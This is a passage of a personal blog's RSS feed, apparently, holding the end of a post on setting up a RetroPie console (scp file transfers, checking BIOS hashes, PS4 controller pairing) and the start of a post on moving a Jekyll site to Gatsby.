&lt;h3 id=&quot;how-do-you-transfer-roms-to-your-retropie-via-ssh&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-do-you-transfer-roms-to-your-retropie-via-ssh&quot; aria-label=&quot;how do you transfer roms to your retropie via ssh permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How do you transfer ROMS to your RetroPie via SSH?&lt;/h3&gt;
&lt;p&gt;The RetroPie Docs have a great page on &lt;a href=&quot;https://retropie.org.uk/docs/Transferring-Roms/&quot;&gt;Transferrin ROMs&lt;/a&gt; with various options. The section for SFTP (also known as SCP) is pretty bare. I seem to forget SCP commands so I thought I would document them here. With SSH enabled on the RetroPie, this is easy. You can copy ROM files using the &lt;code class=&quot;language-text&quot;&gt;scp&lt;/code&gt; command. The &lt;strong&gt;general structure of the command&lt;/strong&gt; is:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;scp myrom.zip username@ipaddress:/location/on/pi/to/copy/to&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;To provide an example.&lt;/strong&gt; I have a SNES ROM called &lt;code class=&quot;language-text&quot;&gt;SF2Turbo.zip&lt;/code&gt; and want to copy it from my laptop to the &lt;code class=&quot;language-text&quot;&gt;~/RetroPie/roms/snes/&lt;/code&gt; folder on my RetroPie. &lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;scp SF2Turbo.zip pi@192.168.1.71:/home/pi/RetroPie/roms/snes&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;If the terminal is not your thing - or you don’t have the SCP command (Windows), an excellent alternative is a graphical tool &lt;a href=&quot;https://filezilla-project.org/&quot;&gt;FileZilla&lt;/a&gt; - developed by the same people who make Firefox. Here is a good tutorial on &lt;a href=&quot;https://www.bettertechtips.com/how-to/use-scp-filezilla/&quot;&gt;How to use SCP in FileZilla&lt;/a&gt; if you are interested. &lt;strong&gt;Lesson learned: SCP is an excellent, easy and fast method to transfer data to and from the RetroPie.&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;where-do-i-get-different-bios-files-for-my-new-retropie&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#where-do-i-get-different-bios-files-for-my-new-retropie&quot; aria-label=&quot;where do i get different bios files for my new retropie permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Where do I get different BIOS files for my new RetroPie?&lt;/h3&gt;
&lt;p&gt;Some emulators require a BIOS to play games. If the console/emulator you are using is in &lt;a href=&quot;https://retropie.org.uk/docs/BIOS/&quot;&gt;this list&lt;/a&gt; - you will need a BIOS. Additionally, some games will run better with a BIOS. This still leaves the question… Where do you get a BIOS from? At first, I tried Googling the BIOS name - which works well as they are usually unique. Using the PS1 as an example, one of the BIOS names is: &lt;code class=&quot;language-text&quot;&gt;scph101.bin&lt;/code&gt;. A good way to check the BIOS you have is legit is by calculating a hash of the file. RetroPie provides MD5 hashes on each console/emulator page. Have a look at the &lt;a href=&quot;https://retropie.org.uk/docs/Playstation-1/#bios&quot;&gt;BIOS section of the PS1&lt;/a&gt; and look for the MD5 column. This is how I validate the files in Linux:&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;none&quot;&gt;&lt;pre class=&quot;language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;echo &quot;6E3735FF4C7DC899EE98981385F6F3D0  scph101.bin&quot; | md5sum -c -&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;OK - I still haven’t answered the question: where do you a BIOS from? On my journeys I found a couple of GitHub repos that provide lots of these BIOS files:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/archtaurus/RetroPieBIOS&quot;&gt;RetroPieBIOS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/Abdess/retroarch_system&quot;&gt;retroarch_system&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Both projects provide hashes to validate the BIOS files - and seem pretty legit (haven’t done a complete repo review). They determine valid BIOS files by comparing against the Libretro database, specifically the &lt;a href=&quot;https://github.com/libretro/libretro-database/blob/master/dat/System.dat&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;System.dat&lt;/code&gt; file&lt;/a&gt;. &lt;strong&gt;Lesson learned: Didn’t learn this, but it is important… Get files from reputable sources and validate!&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;why-is-my-ps4-controller-blinking-white-when-connecting-to-the-retropie-via-usb&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#why-is-my-ps4-controller-blinking-white-when-connecting-to-the-retropie-via-usb&quot; aria-label=&quot;why is my ps4 controller blinking white when connecting to the retropie via usb permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Why is my PS4 controller blinking white when connecting to the RetroPie via USB?&lt;/h3&gt;
&lt;p&gt;When I first connected my PS4 controller via USB to the RetroPie the controller light kept blinking white. I thought it was not charged at first - but it was. So it seemed like a connection issue. After a quick search, it seemed other users experienced the same issue, which was caused by a USB cable that could not provide enough power. I changed from a phone USB cable to a portable speaker USB cable. Problem solved! &lt;strong&gt;Lesson learned - try another USB cable&lt;/strong&gt;.&lt;/p&gt;
&lt;h3 id=&quot;how-can-i-connect-my-ps4-controller-to-my-retropie-using-bluetooth&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#how-can-i-connect-my-ps4-controller-to-my-retropie-using-bluetooth&quot; aria-label=&quot;how can i connect my ps4 controller to my retropie using bluetooth permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;How can I connect my PS4 controller to my RetroPie using Bluetooth?&lt;/h3&gt;
&lt;p&gt;There seem to be a bunch of options for connecting a PS4 controller to a RetroPie via Bluetooth. The &lt;a href=&quot;https://retropie.org.uk/docs/PS4-Controller/&quot;&gt;RetroPie Docs on the PS4 controller&lt;/a&gt; outline 4 different methods. I choose to connect the controller using the built-in Bluetooth module on the Raspberry Pi 4 - as it seemed the easiest. I don’t want to admit it, but I struggled with this for a while. I used the &lt;code class=&quot;language-text&quot;&gt;raspi-config&lt;/code&gt; tool to try and pair the device, with no success. The docs state the following:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;To put the controller into pairing mode, press and hold the Share button then the PS button.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Sounds easy?! Maybe I am an idiot because (to me) it reads: Press and hold the Share button, press the PS button and then release both. Nope! &lt;strong&gt;Press and hold&lt;/strong&gt; both buttons, and keep holding! &lt;strong&gt;Lesson learned: Press and hold, and learn to read&lt;/strong&gt;!!!&lt;/p&gt;
&lt;h2 id=&quot;conclusion&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#conclusion&quot; aria-label=&quot;conclusion permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;So far, I have only just scratched the surface with my new retro gaming console. Life is good! I haven’t had a console for about 15 years - so it is nice to have a lounge + TV gaming setup. But there is still lots to do, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Get a case! ASAP!&lt;/li&gt;
&lt;li&gt;Get another controller for 2 player games&lt;/li&gt;
&lt;li&gt;Tweak settings, improve performance, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Hope you enjoyed this post and learned something from it. Hopefully, I will be back with some more RetroPie or Raspberry Pi-themed posts - as this has been an awesome experience so far. Until then, I will continue my mission to complete every Tony Hawk Pro Skater game…&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Lessons learned moving a Jekyll blog to Gatsby]]></title><description><![CDATA[Been a while since I blogged about stuff. The perils of changing jobs and moving cities numerous times in the last couple of years put a bit…]]></description><link>https://thomaslaurenson.com/blog/2021-01-24/lessons-learned-moving-a-jekyll-blog-to-gatsby/</link><guid isPermaLink="false">https://thomaslaurenson.com/blog/2021-01-24/lessons-learned-moving-a-jekyll-blog-to-gatsby/</guid><pubDate>Sun, 24 Jan 2021 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Been a while since I blogged about stuff. The perils of changing jobs and moving cities numerous times in the last couple of years put a bit of a block on any progress. Looking at my personal website/portfolio in 2021 made me a little sad - outdated and unloved. So, I took some time to do a rewrite using some of the skills I have learned since I last was developing the website - namely JavaScript, React, and Gatsby. This blog is a discussion of the process and some of the more interesting things that happened along the way.&lt;/p&gt;
&lt;h2 id=&quot;contents&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#contents&quot; aria-label=&quot;contents permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contents&lt;/h2&gt;
&lt;div class=&quot;table-of-contents&quot;&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#a-brief-history&quot;&gt;A Brief History&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#picking-a-static-site-generator-ssg&quot;&gt;Picking a Static Site Generator (SSG)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#jekyll-to-gatsby-easy&quot;&gt;Jekyll to Gatsby? Easy?!&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#choosing-a-gatsby-starter&quot;&gt;Choosing a Gatsby Starter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#existing-blogs&quot;&gt;Existing Blogs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#automating-markdown-changes&quot;&gt;Automating Markdown Changes&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#designing-the-portfolio-and-blog&quot;&gt;Designing the Portfolio and Blog&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#choosing-a-component-framework&quot;&gt;Choosing a Component Framework&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#finding-inspiration&quot;&gt;Finding Inspiration&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#redesigning-everything&quot;&gt;Redesigning Everything&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#deploying-a-gatsby-blog-on-github-pages&quot;&gt;Deploying a Gatsby Blog on GitHub Pages&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#conslusion&quot;&gt;Conslusion&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;h2 id=&quot;a-brief-history&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#a-brief-history&quot; aria-label=&quot;a brief history permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;A Brief History&lt;/h2&gt;
&lt;p&gt;Maybe some context will help outline why I wanted to convert my rewrite my website and blog. My old website was written using &lt;a href=&quot;https://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt; and it worked well. Jekyll was generally easy to manage and was simple to write and publish blog posts written in markdown. But it comes with some problems. Or, a better way to summarise it, there were some things I didn’t like.&lt;/p&gt;
&lt;p&gt;Jekyll is written in Ruby. I don’t write in Ruby much, don’t understand it in detail, and have no real need to start writing or learning Ruby. This means the only reason I have a Ruby environment is for my blog. I haven’t even installed Ruby on my laptop for about a year. Similar to other devs, I made a &lt;a href=&quot;https://www.docker.com/&quot;&gt;Docker&lt;/a&gt; solution for blog development - but it was a little slow and clunky. Especially when the Docker environment was not used to deploy - as I used GitHub pages.&lt;/p&gt;
&lt;p&gt;Another big point was I have been doing lots of Node development, including some React, as well as getting better at modern JavaScript. We use React at my work, and it also seems to have become ridiculously popular. All were reasons I started learning it. So why not have a blog written in a Node environment using React.&lt;/p&gt;
&lt;p&gt;Another reason I wanted to rewrite the blog was to get some modern functionality that was easy to implement. Things like progressive image loading, offline access, asset pipelines, component design, and overall better performance. A quick review of my current Jekyll website performance using Chrome Lighthouse shows room for improvement - and a very boring-looking website.&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/28203b8e331b76e0f73572152afdff9a/91b29/current-jekyll-blog-lighthouse.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 43.0379746835443%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAAC4jAAAuIwF4pT92AAABmElEQVQoz32SaWvbQBCG9f//T2lLoYFCIdDS2iH1B8uXHB+SJXl1rlbH+umOEpn0SwdeZnaYeeda73K5kGUZoqMowhiDyO12GyHSti1BEHA8HTkcj7zs96xWO3w/II5jVKZIrimz2QyvrBu06SgqPaJuDE3bjb4JTdsTxQnKkWbxlfAccTonnM8xcZqjaw0DLJ7/4H34+Invjz9oOkvTO3QD2hHodrjbopUqOOQhW3ul62qoX7BtDuWOqivYkvPz6RfecrVh/rwgSlzli6saxf/YgqyqyVXJXG14MGtMuWc4fsXWBzh9ITExn+2Sb78f8fz1lm1wYLXZIeTy9p293gbs9gfCOKV2Y6cqJ01Syqqi0Zo8z8bdyg77vh93PZcdqqJCkJU12Zs9QYhex+/JXZdToojYckTR1trRt1gs8Ky75HvIZa29jUHDMNA7DM7uum5Mni6vXZdhGI5xE6Hv+3jug9yr8hYsiTKWjGRM64j70fe+Q60bd2VHONi7b7lc4k3/7X+Yiki3SDEZv8moCoUyFWVe3An/As4dsGtUIscnAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;img
        class=&quot;gatsby-resp-image-image&quot;
        alt=&quot;Current Jekyll powered blog with Chrome Lighthouse results&quot;
        title=&quot;Current Jekyll powered blog with Chrome Lighthouse results&quot;
        src=&quot;/static/28203b8e331b76e0f73572152afdff9a/f058b/current-jekyll-blog-lighthouse.png&quot;
        srcset=&quot;/static/28203b8e331b76e0f73572152afdff9a/c26ae/current-jekyll-blog-lighthouse.png 158w,
/static/28203b8e331b76e0f73572152afdff9a/6bdcf/current-jekyll-blog-lighthouse.png 315w,
/static/28203b8e331b76e0f73572152afdff9a/f058b/current-jekyll-blog-lighthouse.png 630w,
/static/28203b8e331b76e0f73572152afdff9a/40601/current-jekyll-blog-lighthouse.png 945w,
/static/28203b8e331b76e0f73572152afdff9a/91b29/current-jekyll-blog-lighthouse.png 983w&quot;
        sizes=&quot;(max-width: 630px) 100vw, 630px&quot;
        style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
        loading=&quot;lazy&quot;
      /&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;I always find a good starting point with a new project is to define a few guidelines for what I want to achieve:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Move to a new stack - the big part!&lt;/li&gt;
&lt;li&gt;Create a beautiful, elegant and sleek UI and better UX&lt;/li&gt;
&lt;li&gt;Improve website performance and Lighthouse scores&lt;/li&gt;
&lt;li&gt;Expand website content to include a portfolio of projects and summary of skills&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;picking-a-static-site-generator-ssg&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#picking-a-static-site-generator-ssg&quot; aria-label=&quot;picking a static site generator ssg permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Picking a Static Site Generator (SSG)&lt;/h2&gt;
&lt;p&gt;I did a lot of research about Static Site Generators (SSG) before choosing a solution. FYI - SSGs help ease the building of a website by processing content and using templates, instead of writing every single page from scratch. Have a read of &lt;a href=&quot;https://www.netlify.com/blog/2020/04/14/what-is-a-static-site-generator-and-3-ways-to-find-the-best-one/&quot;&gt;What is a Static Site Generator?&lt;/a&gt; if you want more info. Jekyll is an SSG, so I thought a modern Node-based SSG would be a good framework.&lt;/p&gt;
&lt;p&gt;So I wanted an SSG that was based on, or compatible, with React - mainly because I wanted to get better at React. A couple of frameworks kept popping up in Google searches:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nextjs.org/&quot;&gt;NextJS&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gatsbyjs.com/&quot;&gt;Gatsby&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;One great page I found comparing Jekyll and NodeJS alternatives was a &lt;a href=&quot;https://www.gatsbyjs.com/features/jamstack/gatsby-vs-jekyll-vs-hugo&quot;&gt;Comparison of Gatsby vs Jekyll vs Hugo&lt;/a&gt; and a &lt;a href=&quot;https://www.gatsbyjs.com/features/jamstack/gatsby-vs-nextjs/&quot;&gt;Comparison of Gatsby vs Next.js&lt;/a&gt;. Another one was &lt;a href=&quot;https://dev.to/jameesy/gatsby-vs-next-js-what-why-and-when-4al5&quot;&gt;Gastby vs Next.JS&lt;/a&gt;. Overall I thought that both, Gatsby and NextJS, seemed highly suitable. So how to choose which one? I always find that trying out some of the tutorials, sample projects, etc., and seeing how I like them. For this process, I used the following tutorials and codebases:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nextjs.org/learn/basics/create-nextjs-app&quot;&gt;Create a Next.js App&lt;/a&gt; and the &lt;a href=&quot;https://github.com/vercel/next-learn-starter/tree/master/demo&quot;&gt;source&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.gatsbyjs.com/docs/quick-start/&quot;&gt;Getting started with Gatsby&lt;/a&gt; and &lt;a href=&quot;https://github.com/gatsbyjs/gatsby-starter-blog&quot;&gt;Gatsby’s blog starter&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This sort of thing takes time - about half a day, or 4 hours or so in this case. But I always think the time is worth it. The process gives you some real experience before making a final decision.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; Do research before making choices and, most importantly, try out some small projects and review the code. In short, try to build something simple using the framework.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;To cut to the chase, after some experimentation and reading… I decided to go with Gatsby. I found the tutorial easy to follow and loved the idea of getting to know more about GraphQL - which Gatsby utilizes. Plan formed. Time to do some coding and make something beautiful. &lt;/p&gt;
&lt;h2 id=&quot;jekyll-to-gatsby-easy&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#jekyll-to-gatsby-easy&quot; aria-label=&quot;jekyll to gatsby easy permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Jekyll to Gatsby? Easy?!&lt;/h2&gt;
&lt;p&gt;This section documents some commentary on some of the important aspects of getting started with Gatsby, creating the new website, and porting content across.&lt;/p&gt;
&lt;h3 id=&quot;choosing-a-gatsby-starter&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#choosing-a-gatsby-starter&quot; aria-label=&quot;choosing a gatsby starter permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Choosing a Gatsby Starter&lt;/h3&gt;
&lt;p&gt;According to Gatsby docs, &lt;a href=&quot;https://www.gatsbyjs.com/starters/?&quot;&gt;Starters&lt;/a&gt; are boilerplate projects that Gatsby developers can use to set up a new site quickly. There are so many starters available, from simple small blog-style starters to larger portfolio + blog starters that are almost ready to be deployed. Choosing one can be hard. I always like to pick a simple starter - as I will probably want to change most of the style and layout.&lt;/p&gt;
&lt;p&gt;I ended up going with &lt;a href=&quot;https://www.gatsbyjs.com/starters/gatsbyjs/gatsby-starter-blog&quot;&gt;Gatsby’s blog starter&lt;/a&gt; - because it was simple, and the most popular. It provided a very solid foundation to grow, but enough substance to get a good idea of how Gatsby works. But that doesn’t mean the other starters are not useful. They are all open source and you can check GitHub for the source to see how others build stuff. &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Lesson learned:&lt;/strong&gt; Instead of just relying on the framework docs, see how other developers design and code by reviewing other Gatsby starters&lt;/p&gt;
&lt;/blockquote&gt;
